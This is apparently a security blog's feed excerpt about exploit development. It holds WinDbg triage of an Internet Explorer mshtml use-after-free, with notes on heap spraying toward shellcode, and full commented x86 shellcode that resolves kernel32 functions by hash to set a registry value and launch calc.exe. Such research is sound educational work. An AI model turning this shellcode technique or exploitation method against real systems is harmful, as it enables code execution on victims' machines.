/&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 6c04235c mshtml!CBase::ContextInvokeEx+0x000005dc&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 6c04c75a mshtml!CElement::ContextInvokeEx+0x0000009d&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 6c04c79a mshtml!CInput::VersionedInvokeEx+0x0000002d&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 6bff3104 mshtml!PlainInvokeEx+0x000000eb&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 6d2fa1bc jscript!IDispatchExInvokeEx2+0x00000104&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 6d2fa107 jscript!IDispatchExInvokeEx+0x0000006a&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 6d2fa388 jscript!InvokeDispatchEx+0x00000098&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 6d2fa432 jscript!VAR::InvokeByName+0x00000139&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 6d30d8e8 jscript!VAR::InvokeDispName+0x0000007d&lt;br /&gt;...&lt;br /&gt;&lt;br /&gt;# At time of crash, [EBX] points to freed memory:&lt;br /&gt;&lt;br /&gt;(3cc.748): Access violation - code c0000005 (first chance)&lt;br /&gt;First chance exceptions are reported before any exception handling.&lt;br /&gt;This exception may be expected and handled.&lt;br /&gt;eax=6ce35100 ebx=073cefb0 ecx=07c06f20 edx=00000000 esi=043dde18 edi=00000000&lt;br /&gt;eip=6cabc400 esp=043dddec ebp=043dde04 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl zr na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00010246&lt;br /&gt;mshtml!CElement::Doc:&lt;br /&gt;6cabc400 8b01&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,dword ptr [ecx]&amp;nbsp; ds:0023:07c06f20=????????&lt;br /&gt;0:005&amp;gt; !heap -p -a poi(ebx)&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; address 07c06f20 found in&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; _DPH_HEAP_ROOT @ 161000&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; in free-ed allocation (&amp;nbsp; DPH_HEAP_BLOCK:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; VirtAddr&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; VirtSize)&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 7af2820:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 7c06000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 2000&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 6dec90b2 verifier!AVrfDebugPageHeapFree+0x000000c2&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 77ab641c ntdll!RtlDebugFreeHeap+0x0000002f&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 77a77b92 ntdll!RtlpFreeHeap+0x0000005d&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 77a42d80 ntdll!RtlFreeHeap+0x00000142&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 7762f1cc kernel32!HeapFree+0x00000014&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 6cb0ebb9 mshtml!CLineServices::DisposePtr+0x00000016&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 70905306 msls31!DestroyILSObjText+0x000001cd&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 7090512b msls31!LsDestroyContext+0x00000091&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 6cb0f171 mshtml!DeinitLineServices+0x00000015&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 6cb1355f mshtml!CLSCache::ReleaseEntry+0x0000003e&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 6cadd1d4 mshtml!CLSMeasurer::Deinit+0x00000036&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 6cb1b304 mshtml!CDisplay::UpdateView+0x00000208&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 6cb18c5c mshtml!CFlowLayout::CommitChanges+0x0000009c&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 6cb18b5c mshtml!CDisplay::WaitForRecalc+0x00000131&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 6ca91a45 mshtml!CFlowLayout::LineStart+0x00000025&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 6ca96625 mshtml!CDisplayPointer::GetLineStart+0x0000008b&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 6ca96571 mshtml!CDisplayPointer::IsAtBOL+0x0000004e&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 6ca90407 mshtml!CCaretTracker::PositionCaretAt+0x00000128&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 6ca90294 mshtml!CCaretTracker::Init2+0x00000053&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 6ca8e8b4 mshtml!CSelectionManager::SetCurrentTracker+0x00000026&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 6ca8feb5 mshtml!CSelectionManager::CreateTrackerForContext+0x00000335&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 6ca8fb99 mshtml!CSelectionManager::SetEditContext+0x0000008d&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 6ca8fadd mshtml!CSelectionManager::SetEditContextFromElement+0x0000032d&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 6ca95223 mshtml!CSelectionManager::SetInitialEditContext+0x00000064&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 6ca95115 mshtml!CSelectionManager::Initialize+0x000001c6&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 6ca9558f mshtml!CHTMLEditor::Initialize+0x00000168&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 6ca33065 mshtml!CDoc::GetHTMLEditor+0x00000058&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 6ca90d6c mshtml!CDoc::CreateServiceW+0x0000038c&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 6cacbc6b mshtml!CDoc::QueryService+0x00000166&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 7301ff58 IEFRAME!CSelectionServicesListenerBase::_GetHTMLEditServices+0x00000044&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 7301fe9c IEFRAME!CSelectionServicesListenerBase::_GetSelectionServices2+0x00000036&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 7301fe3a IEFRAME!CSelectionServicesListenerBase::_InstallSelectionServicesListener+0x0000001c&lt;/textarea&gt;&lt;/pre&gt;The size that gets allocated to the CObjectElement object is 0xE0. It is also handy to see the call stacks of what allocated and freed the object. The size allocated for the object was determined via dynamic analysis. There's more than one way to skin a cat though. The same information can be gleaned via static analysis. A brief glance of the mshtml!CObjectElement::CreateElement function (which was called in the call stack above) in IDA shows that 0xE0 bytes is allocated for CObjectElement.&lt;br /&gt;&lt;br /&gt;&lt;div class="separator" style="clear: both; text-align: center;"&gt;&lt;a href="http://1.bp.blogspot.com/-6ZVgXbq6wic/ThXiApf4TwI/AAAAAAAAABY/W3ufwkKj0zY/s1600/CObjectElement_Allocation.jpg" style="margin-left: 1em; margin-right: 1em;"&gt;&lt;img border="0" height="144" src="http://1.bp.blogspot.com/-6ZVgXbq6wic/ThXiApf4TwI/AAAAAAAAABY/W3ufwkKj0zY/s400/CObjectElement_Allocation.jpg" width="400" /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div style="text-align: left;"&gt;&lt;/div&gt;&lt;br /&gt;According to the disassembly (for CObjectElement::CObjectElement), the actual size of the class is 0xDC. However, 0xE0 is allocated on the heap because the compiler rounded up the size to the nearest DWORD boundary.&lt;br /&gt;&lt;br /&gt;&lt;div class="separator" style="clear: both; text-align: center;"&gt;&lt;a href="http://3.bp.blogspot.com/-7sNWY36DtDE/ThXiggyxhNI/AAAAAAAAABc/D8TvuLs43TQ/s1600/CObjectElement_Constructor.jpg" style="margin-left: 1em; margin-right: 1em;"&gt;&lt;img border="0" height="290" src="http://3.bp.blogspot.com/-7sNWY36DtDE/ThXiggyxhNI/AAAAAAAAABc/D8TvuLs43TQ/s400/CObjectElement_Constructor.jpg" width="400" /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;Lastly, although it is not always necessary for exploitation, let's determine the actual function that should have been called at the time of the crash. This can be accomplished several ways in Windbg.&lt;br /&gt;&lt;pre&gt;&lt;textarea readonly="readonly" rows="20" wrap="off"&gt;0:005&amp;gt; ln poi(mshtml!CObjectElement::`vftable'+0x70)&lt;br /&gt;(6d6bc3d0)&amp;nbsp;&amp;nbsp; mshtml!CElement::SecurityContext&amp;nbsp;&amp;nbsp; |&amp;nbsp; (6d6bc400)&amp;nbsp;&amp;nbsp; mshtml!CElement::Doc&lt;br /&gt;Exact matches:&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; mshtml!CElement::SecurityContext = &amp;lt;no type information&amp;gt;&lt;br /&gt;&lt;br /&gt;or:&lt;br /&gt;&lt;br /&gt;0:005&amp;gt; ? mshtml!CObjectElement::`vftable'+0x70&lt;br /&gt;Evaluate expression: 1834688176 = 6d5b1eb0&lt;br /&gt;0:005&amp;gt; dds mshtml!CObjectElement::`vftable'&lt;br /&gt;6d5b1e40&amp;nbsp; 6d5b17fa mshtml!CObjectElement::PrivateQueryInterface&lt;br /&gt;6d5b1e44&amp;nbsp; 6d6bc443 mshtml!CElement::PrivateAddRef&lt;br /&gt;6d5b1e48&amp;nbsp; 6d6bc466 mshtml!CElement::PrivateRelease&lt;br /&gt;6d5b1e4c&amp;nbsp; 6d62ce9b mshtml!CObjectElement::`vector deleting destructor'&lt;br /&gt;6d5b1e50&amp;nbsp; 6d644ad5 mshtml!CSite::Init&lt;br /&gt;6d5b1e54&amp;nbsp; 6d62cc29 mshtml!CObjectElement::Passivate&lt;br /&gt;6d5b1e58&amp;nbsp; 6d6bbd95 mshtml!CBase::IsRootObject&lt;br /&gt;6d5b1e5c&amp;nbsp; 6d7585a6 mshtml!CBase::EnumerateTrackedReferences&lt;br /&gt;6d5b1e60&amp;nbsp; 6d81fe3a mshtml!CBase::SetTrackedState&lt;br /&gt;6d5b1e64&amp;nbsp; 6d605743 mshtml!CElement::GetInlineStylePtr&lt;br /&gt;6d5b1e68&amp;nbsp; 6d6e6a10 mshtml!CElement::GetRuntimeStylePtr&lt;br /&gt;6d5b1e6c&amp;nbsp; 6d8b91cf mshtml!CBase::VersionedGetIDsOfNames&lt;br /&gt;6d5b1e70&amp;nbsp; 6d845847 mshtml!CElement::VersionedInvoke&lt;br /&gt;6d5b1e74&amp;nbsp; 6d5b2e75 mshtml!COleSite::VersionedGetDispID&lt;br /&gt;6d5b1e78&amp;nbsp; 6d5b2b83 mshtml!CObjectElement::VersionedInvokeEx&lt;br /&gt;6d5b1e7c&amp;nbsp; 6d764d4e mshtml!CBase::VersionedDeleteMemberByName&lt;br /&gt;6d5b1e80&amp;nbsp; 6d877b83 mshtml!CBase::VersionedDeleteMemberByDispID&lt;br /&gt;6d5b1e84&amp;nbsp; 6d73c532 mshtml!COmWindowProxy::VersionedGetDispID&lt;br /&gt;6d5b1e88&amp;nbsp; 6d52092c mshtml!CBase::VersionedGetMemberName&lt;br /&gt;6d5b1e8c&amp;nbsp; 6d73c532 mshtml!COmWindowProxy::VersionedGetDispID&lt;br /&gt;6d5b1e90&amp;nbsp; 6d8b921e mshtml!CBase::VersionedGetNameSpaceParent&lt;br /&gt;6d5b1e94&amp;nbsp; 6d877ecb mshtml!CBase::GetEnabled&lt;br /&gt;6d5b1e98&amp;nbsp; 6d877ecb mshtml!CBase::GetEnabled&lt;br /&gt;6d5b1e9c&amp;nbsp; 6d9448dd mshtml!COleSite::GetPages&lt;br /&gt;6d5b1ea0&amp;nbsp; 6d94488f mshtml!COleSite::InterfaceSupportsErrorInfo&lt;br /&gt;6d5b1ea4&amp;nbsp; 6d943cbb mshtml!CObjectElement::QueryStatus&lt;br /&gt;6d5b1ea8&amp;nbsp; 6d943d3b mshtml!CObjectElement::Exec&lt;br /&gt;6d5b1eac&amp;nbsp; 6d6c7770 mshtml!CHtmBodyParseCtx::GetHpxEmbed&lt;br /&gt;6d5b1eb0&amp;nbsp; 6d6bc3d0 mshtml!CElement::SecurityContext&lt;br /&gt;6d5b1eb4&amp;nbsp; 6d6e302d mshtml!CBase::SecurityContextAllowsAccess&lt;br /&gt;6d5b1eb8&amp;nbsp; 6d828617 mshtml!CElement::DesignMode&lt;br /&gt;6d5b1ebc&amp;nbsp; 6d5fe445 mshtml!CElement::SupportedCSSLevel&lt;/textarea&gt;&lt;/pre&gt;The function that should have been called was mshtml!CElement::SecurityContext.&lt;br /&gt;&lt;br /&gt;So to refresh our memories, what was needed to begin exploiting a use-after-free bug?&lt;br /&gt;&lt;br /&gt;1) The type of object referenced after being freed&lt;br /&gt;2) The size allocated to the object&lt;br /&gt;&lt;br /&gt;There is no magic command that will give you this information and as usual, there is always more than one way to obtain this information. The key is to understand what lead to the crash. The next step is to utilize javascript to declare string variables that will allocate fake objects in the heap that point to attacker controlled shellcode (via heap spraying). This can be accomplished reliably without needing to point to a typical address like 0x0C0C0C0C which serves as both an address in the heap and a NOP slide. More on that in a future blog post...&lt;br /&gt;&lt;br /&gt;References:&lt;br /&gt;&lt;br /&gt;&lt;a name="3_1"&gt;&lt;/a&gt;1. N. Johnson, "Insecticides don't kill bugs, Patch Tuesdays do," &lt;br /&gt;June 16, 2011, http://d0cs4vage.blogspot.com/2011/06/insecticides-dont-kill-bugs-patch.html&lt;div class="blogger-post-footer"&gt;&lt;img alt="" height="1" src="https://blogger.googleusercontent.com/tracker/6052198192158185644-5403222886475465556?l=exploit-monday.com" width="1" /&gt;&lt;/div&gt;</description><pubDate>Thu, 07 Jul 2011 17:00:00 +0000</pubDate></item><item><title>Cool kids pop a programmer's calc in their demos</title><link>http://www.exploit-monday.com/2011/07/cool-kids-pop-programmers-calc-in-their.html</link><description>&lt;div style="text-align: justify;"&gt;Over time, I've heard several well-respected security professionals mention that you're not really cool unless you can pop a scientific/programmer's calculator when demoing your exploits. I mean, what right does a standard, run of the mill calculator have showing its face to a crowd of enthralled conference attendees watching the latest version of Windows 7 get totally pwned? And how many self-respecting security folks use a standard calc more than the programmer's calc?  So rather than waste the time of the people who thought this would be cool, I thought it would be better to waste my own time to complete this silly challenge. So without further ado, prepare to do some hexadecimal math. I'd like to mention that Jacob Appelbaum (@ioerror) and Aaron Portnoy (@aaronportnoy) inspired me to write this. ;D&lt;/div&gt;&lt;br /&gt;&lt;div style="text-align: justify;"&gt;To start, I used procmon to observe how calc was interacting with the OS when switching from standard to programmer's mode.&lt;/div&gt;&lt;br /&gt;&lt;div class="separator" style="clear: both; text-align: center;"&gt;&lt;a href="http://4.bp.blogspot.com/-dZSZlnIUmLs/TibLw_-Sc9I/AAAAAAAAABg/BX8s1IXGnXg/s1600/procmon_calc.jpg" style="margin-left: 1em; margin-right: 1em;"&gt;&lt;img border="0" height="162" src="http://4.bp.blogspot.com/-dZSZlnIUmLs/TibLw_-Sc9I/AAAAAAAAABg/BX8s1IXGnXg/s400/procmon_calc.jpg" width="400" /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;&lt;div style="text-align: justify;"&gt;It turns out that it modifies the following registry key: HKCU\Software\Microsoft\Calc\layout and changes the REG_DWORD value to 0x00000002 when switching to a programmer's calc.&lt;/div&gt;&lt;br /&gt;&lt;div style="text-align: justify;"&gt;One of the nice features of procmon is that it lets you view the stack trace of each entry. Here's the stack trace for the call to RegSetValue:&lt;/div&gt;&lt;br /&gt;&lt;div class="separator" style="clear: both; text-align: center;"&gt;&lt;a href="http://4.bp.blogspot.com/-vsSs5jtMqUY/TibMFJCPjoI/AAAAAAAAABk/u-CbTNoI9EQ/s1600/procmon_stack_trace.jpg" style="margin-left: 1em; margin-right: 1em;"&gt;&lt;img border="0" height="400" src="http://4.bp.blogspot.com/-vsSs5jtMqUY/TibMFJCPjoI/AAAAAAAAABk/u-CbTNoI9EQ/s400/procmon_stack_trace.jpg" width="392" /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;&lt;div style="text-align: justify;"&gt;So, to get my shellcode to work, I'll likely need to understand how calc.exe modifies the registry. After loading calc.exe into IDA, I quickly determined that it calls the folowing functions, which procmon graciously gave me the offsets to:&lt;/div&gt;&lt;br /&gt;&lt;ul&gt;&lt;li&gt;RegCreateKeyExW&lt;/li&gt;&lt;li&gt;RegSetValueExW&lt;/li&gt;&lt;li&gt;RegCloseKey&lt;/li&gt;&lt;/ul&gt;&lt;br /&gt;&lt;div style="text-align: justify;"&gt;IDA in conjunction with my debugger conveniently gave me all the parameters I needed to pass to these functions. For more information on the function parameters, refer to MSDN documentation.&lt;/div&gt;&lt;br /&gt;&lt;div style="text-align: justify;"&gt;The only problem is that the shellcode needs to first determine the addresses to these functions, which turns out to be the bulk of my shellcode. I should be careful when saying 'my' shellcode considering I modified SkyLined's awesome w32-exec-calc-shellcode[&lt;a href="http://www.exploit-monday.com/feeds/posts/default#4_1"&gt;1&lt;/a&gt;] which I believe was loosely based upon Matt Miller's paper - "Understanding Windows Shellcode[&lt;a href="http://www.exploit-monday.com/feeds/posts/default#4_2"&gt;2&lt;/a&gt;]."&lt;/div&gt;&lt;br /&gt;&lt;div style="text-align: justify;"&gt;It's worth noting that if your shellcode is running in the stack, careful considerations must be made when writing your assembly. Specifically, the shellcode instructions and function parameters share the same space. Because you are executing code from the stack, you have to be careful not to clobber your instructions. So what I did was move esp (which would point to the first instruction) into ebp [MOV EBP, ESP] and essentially create my own stack frame above the code.&lt;/div&gt;&lt;br /&gt;&lt;div style="text-align: justify;"&gt;Here is the shellcode with relevant comments for your convenience. Note that this will only work on 32-bit Windows and it has only been tested on Windows 7 SP1 :&lt;/div&gt;&lt;br /&gt;w32-programmer-calc hex&lt;br /&gt;&lt;pre&gt;&lt;textarea readonly="readonly" rows="3"&gt;&lt;br /&gtlt;/textarea&gt;&lt;/pre&gt;w32-programmer-calc assembly&lt;br /&gt;&lt;pre&gt;&lt;textarea readonly="readonly" rows="106" wrap="off"&gt;&lt;br /&gt;8BEC           MOV EBP,ESP ; Save EBP-based frame pointer&lt;br /&gt;33F6           XOR ESI,ESI&lt;br /&gt;33C0           XOR EAX,EAX&lt;br /&gt;6A 01          PUSH 1      ; Placeholder for WinExec address&lt;br /&gt;6A 01          PUSH 1      ; Placeholder for RegCloseKey&lt;br /&gt;6A 01          PUSH 1      ; Placeholder for RegSetValueExW&lt;br /&gt;6A 01          PUSH 1      ; Placeholder for RegCreateKeyExW&lt;br /&gt;68 D43710F5    PUSH F51037D4 ; Hash values for RegCloseKey and WinExec&lt;br /&gt;68 C01584E8    PUSH E88415C0 ; Hash values for RegCreateKeyExW and RegSetValueExW&lt;br /&gt;6A 01          PUSH 1 ; Placeholder for module base address (kernel32.dll eventually)&lt;br /&gt;6A 01          PUSH 1 ; Placeholder for open registry key handle&lt;br /&gt;64:8B76 30     MOV ESI,DWORD PTR FS:[ESI+30] ; fs:[0x30] - Pointer to the PEB&lt;br /&gt;8B76 0C        MOV ESI,DWORD PTR DS:[ESI+C]  ; PEB pointer to PEB_LDR_DATA struct&lt;br /&gt;8B76 1C        MOV ESI,DWORD PTR DS:[ESI+1C] ; Extract entries in the initialization order module list&lt;br /&gt;locate_kernel32:&lt;br /&gt;FF76 08        PUSH DWORD PTR DS:[ESI+8]     ; Save module base address to stack&lt;br /&gt;8F45 E4        POP DWORD PTR SS:[EBP-1C]     ; Save module base address to stack&lt;br /&gt;8B36           MOV ESI,DWORD PTR DS:[ESI]    ; Pointer to the next loaded module&lt;br /&gt;8B5D E4        MOV EBX,DWORD PTR SS:[EBP-1C] ; Offset to dll's PE signature&lt;br /&gt;83C3 3C        ADD EBX,3C                    ; Skip over MSDOS header&lt;br /&gt;8B1B           MOV EBX,DWORD PTR DS:[EBX]    ; Offset to dll's PE signature&lt;br /&gt;83C3 78        ADD EBX,78                    ; Offset to module's Export Address Table (EAT)&lt;br /&gt;035D E4        ADD EBX,DWORD PTR SS:[EBP-1C] ; EAT offset&lt;br /&gt;8B1B           MOV EBX,DWORD PTR DS:[EBX]    ; Save offset&lt;br /&gt;035D E4        ADD EBX,DWORD PTR SS:[EBP-1C] ; Add to module basee address&lt;br /&gt;find_next_function:&lt;br /&gt;8B4B 18        MOV ECX,DWORD PTR DS:[EBX+18] ; Extract # of exported functions&lt;br /&gt;67:E3 DF       JCXZ SHORT locate_kernel32    ; Go to next loaded module if current module doesn't export any functions&lt;br /&gt;extract_function_name:&lt;br /&gt;8B7B 20        MOV EDI,DWORD PTR DS:[EBX+20] ; Extract the function name table array offset&lt;br /&gt;037D E4        ADD EDI,DWORD PTR SS:[EBP-1C] ; Address of function name table array&lt;br /&gt;8B7C8F FC      MOV EDI,DWORD PTR DS:[EDI+ECX*4-4] ; Indexed function name&lt;br /&gt;037D E4        ADD EDI,DWORD PTR SS:[EBP-1C] ; Current function name in ASCII&lt;br /&gt;33D2           XOR EDX,EDX&lt;br /&gt;function_name_hash:&lt;br /&gt;3217           XOR DL,BYTE PTR DS:[EDI]      ; XOR current character with DL&lt;br /&gt;66:D1CA        ROR DX,1    ; Rotate DX by one&lt;br /&gt;50             PUSH EAX    ; Save counter&lt;br /&gt;33C0           XOR EAX,EAX&lt;br /&gt;AE             SCAS BYTE PTR ES:[EDI]        ; Is current character == NULL?&lt;br /&gt;58             POP EAX     ; Restore counter&lt;br /&gt;75 F4          JNZ SHORT function_name_hash ; Calc hash until null terminator&lt;br /&gt;66:3B5445 E8   CMP DX,WORD PTR SS:[EBP+EAX*2-18] ; Does current function match indexed hash?&lt;br /&gt;E0 DE          LOOPDNE SHORT extract_function_name ; No? Get next functions name&lt;br /&gt;75 BB          JNZ SHORT locate_kernel32         ; Hash found? Extract function address&lt;br /&gt;8B53 24        MOV EDX,DWORD PTR DS:[EBX+24]     ; Extract ordinals table relative offset&lt;br /&gt;0355 E4        ADD EDX,DWORD PTR SS:[EBP-1C]     ; kernel32 ordinals table&lt;br /&gt;0FB7144A       MOVZX EDX,WORD PTR DS:[EDX+ECX*2] ; Extract current function's ordinal number&lt;br /&gt;8B7B 1C        MOV EDI,DWORD PTR DS:[EBX+1C]     ; Extract the address table relative offset&lt;br /&gt;037D E4        ADD EDI,DWORD PTR SS:[EBP-1C]     ; kernel32.dll address table&lt;br /&gt;8B3497         MOV ESI,DWORD PTR DS:[EDI+EDX*4]  ; Offset to function address&lt;br /&gt;0375 E4        ADD ESI,DWORD PTR SS:[EBP-1C]     ; kernel32 function address&lt;br /&gt;897485 F0      MOV DWORD PTR SS:[EBP+EAX*4-10],ESI ; Save function address relative to EBP&lt;br /&gt;40             INC EAX     ; Increase counter&lt;br /&gt;83F8 04        CMP EAX,4   ; Found all four functions?&lt;br /&gt;75 B6          JNZ SHORT find_next_function ; Yes? Start pushing params and call functions&lt;br /&gt;33DB           XOR EBX,EBX&lt;br /&gt;6A 63          PUSH 63     ; Push key: Unicode "Software\Microsoft\Calc"&lt;br /&gt;68 61006C00    PUSH 6C0061&lt;br /&gt;68 5C004300    PUSH 43005C&lt;br /&gt;68 66007400    PUSH 740066&lt;br /&gt;68 73006F00    PUSH 6F0073&lt;br /&gt;68 72006F00    PUSH 6F0072&lt;br /&gt;68 69006300    PUSH 630069&lt;br /&gt;68 5C004D00    PUSH 4D005C&lt;br /&gt;68 72006500    PUSH 650072&lt;br /&gt;68 77006100    PUSH 610077&lt;br /&gt;68 66007400    PUSH 740066&lt;br /&gt;68 53006F00    PUSH 6F0053&lt;br /&gt;53             PUSH EBX    ; lpdwDisposition&lt;br /&gt;8D45 E0        LEA EAX,DWORD PTR SS:[EBP-20]; Pointer to registry key handle&lt;br /&gt;50             PUSH EAX    ; Pointer to registry key handle&lt;br /&gt;53             PUSH EBX    ; lpSecurityAttributes&lt;br /&gt;68 06000200    PUSH 20006  ; samDesired (STANDARD_RIGHTS_WRITE, KEY_SET_VALUE, and KEY_CREATE_SUB_KEY)&lt;br /&gt;53             PUSH EBX    ; dwOptions&lt;br /&gt;53             PUSH EBX    ; lpClass&lt;br /&gt;53             PUSH EBX    ; reserved&lt;br /&gt;8D4424 1C      LEA EAX,DWORD PTR SS:[ESP+1C] ; lpSubKey&lt;br /&gt;50             PUSH EAX    ; lpSubKey - Pointer to "Software\Microsoft\Calc"&lt;br /&gt;68 01000080    PUSH 80000001                 ; hKey (HKCU)&lt;br /&gt;FF55 F0        CALL DWORD PTR SS:[EBP-10]    ; Call kernel32!RegCreateKeyExW&lt;br /&gt;6A 00          PUSH 0      ; Push key value name: Unicode "layout"&lt;br /&gt;68 75007400    PUSH 740075&lt;br /&gt;68 79006F00    PUSH 6F0079&lt;br /&gt;68 6C006100    PUSH 61006C&lt;br /&gt;6A 02          PUSH 2      ; Setting for programmer's calc :D&lt;br /&gt;6A 04          PUSH 4      ; cbData - Size of data&lt;br /&gt;8D4424 04      LEA EAX,DWORD PTR SS:[ESP+4]  ; lpData - Pointer to programmer's calc value&lt;br /&gt;50             PUSH EAX    ; lpData - Pointer to programmer's calc value&lt;br /&gt;6A 04          PUSH 4      ; dwType - REG_DWORD&lt;br /&gt;6A 00          PUSH 0      ; reserved&lt;br /&gt;8D4424 14      LEA EAX,DWORD PTR SS:[ESP+14] ; lpValueName - pointer to 'layout' Unicode string&lt;br /&gt;50             PUSH EAX ; lpValueName - pointer to 'layout' Unicode string&lt;br /&gt;FF75 E0        PUSH DWORD PTR SS:[EBP-20]    ; hKey - Open registry key handle&lt;br /&gt;FF55 F4        CALL DWORD PTR SS:[EBP-C]     ; Call kernel32!RegSetValueExW&lt;br /&gt;FF75 E0        PUSH DWORD PTR SS:[EBP-20]    ; hKey - Open registry key handle&lt;br /&gt;FF55 F8        CALL DWORD PTR SS:[EBP-8]     ; Call kernel32!RegCloseKey&lt;br /&gt;6A 00          PUSH 0&lt;br /&gt;68 2E657865    PUSH 6578652E                 ; "calc.exe"&lt;br /&gt;68 63616C63    PUSH 636C6163&lt;br /&gt;54             PUSH ESP    ; pointer to address of ascii string: "calc.exe"&lt;br /&gt;870424         XCHG DWORD PTR SS:[ESP],EAX   ; uCmdShow - Bring calculator to the front of the desktop&lt;br /&gt;50             PUSH EAX   ; pointer to address of ascii string: "calc.exe"&lt;br /&gt;FF55 FC        CALL DWORD PTR SS:[EBP-4]     ; Call kernel32!WinExec&lt;br /&gt;CC             INT3       ; Debugger trap&lt;/textarea&gt;&lt;/pre&gt;&lt;br /&gt;Areas of improvement:&lt;br /&gt;&lt;ul style="text-align: justify;"&gt;&lt;li&gt;Remove all nulls. This would be relatively easy but I am lazy. Perhaps in a future version.&lt;/li&gt;&lt;li&gt;Only one byte of this needs to be modified to pop a scientific calc on Vista. This can be left as an exercise for the readers.&lt;/li&gt;&lt;li&gt;This could scan for the OS version and determine dynamically whether to pop a scientific (pre-Windows 7) vs programmer's calc. Do you really want to be popping calcs on anything besides Windows 7 though? ;D&lt;/li&gt;&lt;li&gt;My assembly is likely total crap. But it works. I'm sure someone out there could trim a couple dozen bytes off it but I'll leave that as a challenge for the assembly ninjas out there.&lt;/li&gt;&lt;/ul&gt;&lt;br /&gt;&lt;div style="text-align: justify;"&gt;Please comment, try it out on your 32-bit Windows 7 machine for yourself, and let me know if it doesn't work and I might make an effort to fix it. 